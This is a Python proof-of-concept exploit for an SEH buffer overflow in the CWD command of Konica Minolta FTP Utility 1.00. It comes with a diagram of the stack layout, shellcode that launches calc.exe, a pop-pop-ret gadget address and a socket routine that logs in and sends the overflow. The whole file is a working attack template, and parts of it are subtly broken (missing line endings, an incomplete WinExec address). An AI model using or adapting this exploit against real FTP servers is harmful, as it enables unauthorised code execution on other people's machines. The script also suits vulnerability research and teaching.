#!/usr/bin/env python

#
# Konica Minolta FTP Utility 1.00 CWD Command SEH overflow
# 0x12206683 : pop edi pop esi ret 0x04 | KMFtpCM.dll
# Tested On: Windows XP SP3 using Immunity dbg and mona.py plugin
#
#                      jmp short xDE (backwards)
#                  +--------------------------------+
#                  |                                |   
#                  v                                ^
#   [AAA..AAA] [NOPNOP] [SHELLCODE] [NOP...NOP] [nextSEH] [SEH] [CCCC...CCCC]
#                                                   ^       v
#                                                   |       |
#                                                   +-------+
#                                                  pop pop ret
#

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = ''     #ip
port = 21

calc =  "\x33\xc0\x50\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x8B\xC4\x6A\x01\x50"
calc += "\xBB" # mov ebx, kernel32.dll!WinExec (5 bytes) -> address of kernel32.dll on your machine
calc += "\xFF\xD3"

payload = "CWD " + "\x41" * 1005 + "\x90" * 2 + calc  +"\x90" * 5  + "\xEB\xDE\x90\x90" + "\x83\x66\x20\x12" + "\x43" * 1005

try:
    s.connect((ip,port))
    print s.recv(1024)
    s.send("USER testuser")
    print s.recv(1024)
    s.send("PASS testpwd")
    print s.recv(1024)
    s.send(payload)
    s.close
except:
    print "Couldn't connect!"
